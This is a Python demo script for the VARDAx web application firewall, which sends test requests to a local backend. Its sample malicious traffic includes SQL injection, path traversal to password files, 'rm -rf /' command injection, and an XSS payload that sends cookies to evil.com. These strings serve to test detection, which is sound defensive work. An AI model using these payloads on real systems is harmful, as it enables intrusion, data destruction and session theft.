#!/usr/bin/env python3
"""
VARDAx Production Features Demo
Demonstrates all real security capabilities
"""
import asyncio
import aiohttp
import json
import time
import random
from datetime import datetime
from typing import Dict, Any, List

class VARDAXProductionDemo:
    """Comprehensive demo of VARDAx production features"""
    
    def __init__(self, base_url: str = "http://localhost:8001"):
        self.base_url = base_url
        self.api_url = f"{base_url}/api/v1"
        
    async def run_complete_demo(self):
        """Run complete production feature demonstration"""
        print("🚀 VARDAx Production Security System Demo")
        print("=" * 60)
        
        async with aiohttp.ClientSession() as session:
            # 1. System Health Check
            await self.demo_system_health(session)
            
            # 2. WAF Engine Demo
            await self.demo_waf_engine(session)
            
            # 3. Traffic Processing Demo
            await self.demo_traffic_processing(session)
            
            # 4. Threat Detection Demo
            await self.demo_threat_detection(session)
            
            # 5. Real-time Monitoring Demo
            await self.demo_realtime_monitoring(session)
            
            # 6. Traffic Simulation Demo
            await self.demo_traffic_simulation(session)
            
            # 7. Security Blocking Demo
            await self.demo_security_blocking(session)
            
        print("\n🎉 Production Demo Complete!")
        print("VARDAx is now a fully functional security system!")
    
    async def demo_system_health(self, session: aiohttp.ClientSession):
        """Demonstrate system health monitoring"""
        print("\n📊 1. SYSTEM HEALTH MONITORING")
        print("-" * 40)
        
        try:
            # Check overall health
            async with session.get(f"{self.base_url}/health") as resp:
                health = await resp.json()
                print(f"✅ System Status: {health.get('status', 'unknown')}")
                
                components = health.get('components', {})
                for component, status in components.items():
                    status_icon = "✅" if status in ['up', 'healthy', 'connected', 'loaded', 'ready'] else "⚠️"
                    print(f"   {status_icon} {component}: {status}")
            
            # Check detailed system status
            async with session.get(f"{self.api_url}/system/status") as resp:
                status = await resp.json()
                metrics = status.get('metrics', {})
                print(f"\n📈 System Metrics:")
                print(f"   Total Requests: {metrics.get('total_requests', 0)}")
                print(f"   Blocked Requests: {metrics.get('blocked_requests', 0)}")
                print(f"   Active Rules: {metrics.get('active_rules', 0)}")
                print(f"   Connected Services: {metrics.get('connected_services', 0)}")
                
        except Exception as e:
            print(f"❌ Health check failed: {e}")
    
    async def demo_waf_engine(self, session: aiohttp.ClientSession):
        """Demonstrate WAF engine capabilities"""
        print("\n🛡️  2. WAF ENGINE DEMONSTRATION")
        print("-" * 40)
        
        try:
            # Get WAF rules
            async with session.get(f"{self.api_url}/waf/rules") as resp:
                rules = await resp.json()
                print(f"✅ Loaded {len(rules)} WAF rules")
                
                # Show rule categories
                rule_types = {}
                for rule in rules:
                    rule_type = rule.get('rule_type', 'unknown')
                    rule_types[rule_type] = rule_types.get(rule_type, 0) + 1
                
                print("📋 Rule Categories:")
                for rule_type, count in rule_types.items():
                    print(f"   • {rule_type}: {count} rules")
            
            # Get WAF statistics
            async with session.get(f"{self.api_url}/waf/stats") as resp:
                stats = await resp.json()
                print(f"\n📊 WAF Statistics:")
                print(f"   Total Rules: {stats.get('total_rules', 0)}")
                print(f"   Enabled Rules: {stats.get('enabled_rules', 0)}")
                print(f"   Block Rate: {stats.get('block_rate', 0):.2f}%")
                
                # Show top triggered rules
                top_rules = stats.get('top_triggered_rules', [])[:3]
                if top_rules:
                    print("🔥 Most Triggered Rules:")
                    for rule_id, count in top_rules:
                        print(f"   • {rule_id}: {count} hits")
            
            # Test WAF with malicious requests
            print("\n🧪 Testing WAF with Attack Patterns:")
            test_requests = [
                {
                    "name": "SQL Injection",
                    "data": {
                        "client_ip": "192.168.1.100",
                        "method": "GET",
                        "uri": "/login?username=admin' OR '1'='1&password=test",
                        "headers": {"User-Agent": "Mozilla/5.0"}
                    }
                },
                {
                    "name": "XSS Attack",
                    "data": {
                        "client_ip": "10.0.0.50",
                        "method": "POST",
                        "uri": "/comment",
                        "body": "<script>alert('XSS')</script>",
                        "headers": {"User-Agent": "Mozilla/5.0"}
                    }
                },
                {
                    "name": "Path Traversal",
                    "data": {
                        "client_ip": "172.16.0.25",
                        "method": "GET",
                        "uri": "/files?path=../../../etc/passwd",
                        "headers": {"User-Agent": "curl/7.68.0"}
                    }
                }
            ]
            
            for test in test_requests:
                async with session.post(f"{self.api_url}/waf/test", json=test["data"]) as resp:
                    result = await resp.json()
                    action = result.get('action', 'unknown')
                    blocked = result.get('blocked', False)
                    matches = result.get('total_matches', 0)
                    
                    status_icon = "🚫" if blocked else "✅"
                    print(f"   {status_icon} {test['name']}: {action} ({matches} rule matches)")
                    
        except Exception as e:
            print(f"❌ WAF demo failed: {e}")
    
    async def demo_traffic_processing(self, session: aiohttp.ClientSession):
        """Demonstrate real traffic processing"""
        print("\n🚦 3. TRAFFIC PROCESSING DEMONSTRATION")
        print("-" * 40)
        
        try:
            # Process legitimate traffic
            legitimate_requests = [
                {
                    "client_ip": "192.168.1.10",
                    "method": "GET",
                    "uri": "/api/users",
                    "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                    "status_code": 200,
                    "response_time_ms": 150
                },
                {
                    "client_ip": "192.168.1.11",
                    "method": "POST",
                    "uri": "/api/login",
                    "body": '{"username": "user@example.com", "password": "password123"}',
                    "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
                    "status_code": 200,
                    "response_time_ms": 300
                }
            ]
            
            print("✅ Processing Legitimate Traffic:")
            for req in legitimate_requests:
                async with session.post(f"{self.api_url}/traffic/process", json=req) as resp:
                    result = await resp.json()
                    status = result.get('status', 'unknown')
                    threat_score = result.get('threat_score', 0)
                    print(f"   • {req['method']} {req['uri']}: {status} (threat: {threat_score:.2f})")
            
            # Process malicious traffic
            malicious_requests = [
                {
                    "client_ip": "203.0.113.50",
                    "method": "GET",
                    "uri": "/admin?cmd=rm -rf /",
                    "headers": {"User-Agent": "python-requests/2.31.0"},
                    "status_code": 403,
                    "response_time_ms": 50
                },
                {
                    "client_ip": "203.0.113.51",
                    "method": "POST",
                    "uri": "/search",
                    "body": "query=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
                    "headers": {"User-Agent": "curl/7.68.0"},
                    "status_code": 403,
                    "response_time_ms": 25
                }
            ]
            
            print("\n🚨 Processing Malicious Traffic:")
            for req in malicious_requests:
                async with session.post(f"{self.api_url}/traffic/process", json=req) as resp:
                    result = await resp.json()
                    status = result.get('status', 'unknown')
                    threat_score = result.get('threat_score', 0)
                    blocked = result.get('blocked', False)
                    block_icon = "🚫" if blocked else "⚠️"
                    print(f"   {block_icon} {req['method']} {req['uri']}: {status} (threat: {threat_score:.2f})")
                    
        except Exception as e:
            print(f"❌ Traffic processing demo failed: {e}")
    
    async def demo_threat_detection(self, session: aiohttp.ClientSession):
        """Demonstrate threat detection capabilities"""
        print("\n🔍 4. THREAT DETECTION DEMONSTRATION")
        print("-" * 40)
        
        try:
            # Get active threats
            async with session.get(f"{self.api_url}/threats/active") as resp:
                threats = await resp.json()
                print(f"🚨 Active Threats: {len(threats)}")
                
                if threats:
                    print("📋 Recent Threat Details:")
                    for threat in threats[:3]:  # Show top 3
                        threat_score = threat.get('threat_score', 0)
                        client_ip = threat.get('client_ip', 'unknown')
                        uri = threat.get('uri', 'unknown')
                        country = threat.get('country', 'unknown')
                        print(f"   • {client_ip} ({country}) -> {uri} (score: {threat_score:.2f})")
                else:
                    print("✅ No active threats detected - system is secure")
            
            # Generate some test threats
            print("\n🧪 Generating Test Threats:")
            attack_patterns = [
                {
                    "client_ip": "203.0.113.100",
                    "method": "GET",
                    "uri": "/admin/config.php?cmd=cat /etc/passwd",
                    "headers": {"User-Agent": "sqlmap/1.7.2#stable"},
                    "country": "Unknown"
                },
                {
                    "client_ip": "203.0.113.101", 
                    "method": "POST",
                    "uri": "/login",
                    "body": "username=admin'--&password=anything",
                    "headers": {"User-Agent": "python-requests/2.31.0"},
                    "country": "China"
                }
            ]
            
            for attack in attack_patterns:
                async with session.post(f"{self.api_url}/traffic/process", json=attack) as resp:
                    result = await resp.json()
                    if result.get('status') == 'blocked':
                        print(f"   🚫 Blocked: {attack['client_ip']} -> {attack['uri']}")
                    else:
                        print(f"   ⚠️  Detected: {attack['client_ip']} -> {attack['uri']}")
                        
        except Exception as e:
            print(f"❌ Threat detection demo failed: {e}")
    
    async def demo_realtime_monitoring(self, session: aiohttp.ClientSession):
        """Demonstrate real-time monitoring"""
        print("\n📈 5. REAL-TIME MONITORING DEMONSTRATION")
        print("-" * 40)
        
        try:
            # Get live statistics
            async with session.get(f"{self.api_url}/stats/live") as resp:
                stats = await resp.json()
                print("📊 Live System Statistics:")
                print(f"   Requests/Second: {stats.get('requests_per_second', 0):.1f}")
                print(f"   Threats Blocked: {stats.get('threats_blocked', 0)}")
                print(f"   Unique IPs: {stats.get('unique_ips', 0)}")
                print(f"   Block Rate: {stats.get('block_rate', 0):.2f}%")
                
                # Show severity breakdown
                severity = stats.get('severity_breakdown', {})
                if any(severity.values()):
                    print("\n🚨 Threat Severity Breakdown:")
                    for level, count in severity.items():
                        if count > 0:
                            icon = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}.get(level, "⚪")
                            print(f"   {icon} {level.title()}: {count}")
            
            # Get detailed metrics
            async with session.get(f"{self.api_url}/metrics/realtime") as resp:
                metrics = await resp.json()
                print(f"\n⚡ Real-time Performance:")
                print(f"   Total Requests: {metrics.get('requests_total', 0)}")
                print(f"   Blocked Requests: {metrics.get('requests_blocked', 0)}")
                print(f"   Average Response Time: {metrics.get('avg_response_time_ms', 0):.1f}ms")
                
                # Show top countries if available
                top_countries = metrics.get('top_countries', {})
                if top_countries:
                    print("\n🌍 Top Traffic Sources:")
                    for country, count in list(top_countries.items())[:3]:
                        print(f"   • {country}: {count} requests")
                        
        except Exception as e:
            print(f"❌ Real-time monitoring demo failed: {e}")
    
    async def demo_traffic_simulation(self, session: aiohttp.ClientSession):
        """Demonstrate traffic simulation"""
        print("\n🎭 6. TRAFFIC SIMULATION DEMONSTRATION")
        print("-" * 40)
        
        try:
            # Get available profiles
            async with session.get(f"{self.api_url}/traffic/simulate/profiles") as resp:
                profiles = await resp.json()
                print(f"📋 Available Traffic Profiles: {len(profiles)}")
                
                for profile in profiles:
                    name = profile.get('name', 'Unknown')
                    rpm = profile.get('requests_per_minute', 0)
                    attack_prob = profile.get('attack_probability', 0) * 100
                    print(f"   • {name}: {rpm} req/min ({attack_prob:.1f}% attacks)")
            
            # Start attack simulation
            print("\n🚨 Starting Attack Wave Simulation...")
            async with session.get(f"{self.api_url}/traffic/simulate/start/attack_wave") as resp:
                result = await resp.json()
                if result.get('status') == 'started':
                    print("✅ Attack simulation started")
                    
                    # Monitor for a few seconds
                    print("📊 Monitoring attack simulation...")
                    for i in range(3):
                        await asyncio.sleep(2)
                        async with session.get(f"{self.api_url}/stats/live") as resp:
                            stats = await resp.json()
                            rps = stats.get('requests_per_second', 0)
                            blocked = stats.get('threats_blocked', 0)
                            print(f"   [{i+1}/3] RPS: {rps:.1f}, Blocked: {blocked}")
                    
                    # Stop simulation
                    async with session.post(f"{self.api_url}/traffic/simulate/stop") as resp:
                        result = await resp.json()
                        if result.get('status') == 'stopped':
                            print("✅ Attack simulation stopped")
                            
        except Exception as e:
            print(f"❌ Traffic simulation demo failed: {e}")
    
    async def demo_security_blocking(self, session: aiohttp.ClientSession):
        """Demonstrate security blocking capabilities"""
        print("\n🚫 7. SECURITY BLOCKING DEMONSTRATION")
        print("-" * 40)
        
        try:
            # Test various attack vectors
            attack_vectors = [
                {
                    "name": "SQL Injection (UNION)",
                    "request": {
                        "client_ip": "203.0.113.200",
                        "method": "GET",
                        "uri": "/search?q=' UNION SELECT * FROM users--",
                        "headers": {"User-Agent": "Mozilla/5.0"}
                    }
                },
                {
                    "name": "Command Injection",
                    "request": {
                        "client_ip": "203.0.113.201",
                        "method": "POST",
                        "uri": "/upload",
                        "body": "filename=test.txt; rm -rf /",
                        "headers": {"User-Agent": "curl/7.68.0"}
                    }
                },
                {
                    "name": "Path Traversal",
                    "request": {
                        "client_ip": "203.0.113.202",
                        "method": "GET",
                        "uri": "/download?file=../../../../etc/shadow",
                        "headers": {"User-Agent": "wget/1.20.3"}
                    }
                },
                {
                    "name": "Malicious User Agent",
                    "request": {
                        "client_ip": "203.0.113.203",
                        "method": "GET",
                        "uri": "/",
                        "headers": {"User-Agent": "sqlmap/1.7.2#stable (http://sqlmap.org)"}
                    }
                }
            ]
            
            print("🧪 Testing Security Blocking:")
            blocked_count = 0
            
            for attack in attack_vectors:
                async with session.post(f"{self.api_url}/traffic/process", json=attack["request"]) as resp:
                    result = await resp.json()
                    status = result.get('status', 'unknown')
                    blocked = result.get('blocked', False) or status == 'blocked'
                    
                    if blocked:
                        blocked_count += 1
                        print(f"   🚫 BLOCKED: {attack['name']}")
                    else:
                        print(f"   ⚠️  ALLOWED: {attack['name']} (may need rule tuning)")
            
            print(f"\n📊 Blocking Effectiveness: {blocked_count}/{len(attack_vectors)} attacks blocked ({blocked_count/len(attack_vectors)*100:.1f}%)")
            
            # Show final system state
            async with session.get(f"{self.api_url}/waf/stats") as resp:
                waf_stats = await resp.json()
                print(f"🛡️  WAF Performance:")
                print(f"   Total Requests Processed: {waf_stats.get('total_requests', 0)}")
                print(f"   Requests Blocked: {waf_stats.get('blocked_requests', 0)}")
                print(f"   Overall Block Rate: {waf_stats.get('block_rate', 0):.2f}%")
                
        except Exception as e:
            print(f"❌ Security blocking demo failed: {e}")

async def main():
    """Main demo function"""
    import sys
    
    # Check if backend is running
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8001"
    
    print(f"🔗 Connecting to VARDAx at: {base_url}")
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{base_url}/health") as resp:
                if resp.status != 200:
                    print("❌ VARDAx backend is not running!")
                    print("   Start it with: ./start-production-vardax.sh")
                    return
    except Exception:
        print("❌ Cannot connect to VARDAx backend!")
        print("   Make sure it's running: ./start-production-vardax.sh")
        return
    
    # Run the demo
    demo = VARDAXProductionDemo(base_url)
    await demo.run_complete_demo()

if __name__ == "__main__":
    asyncio.run(main())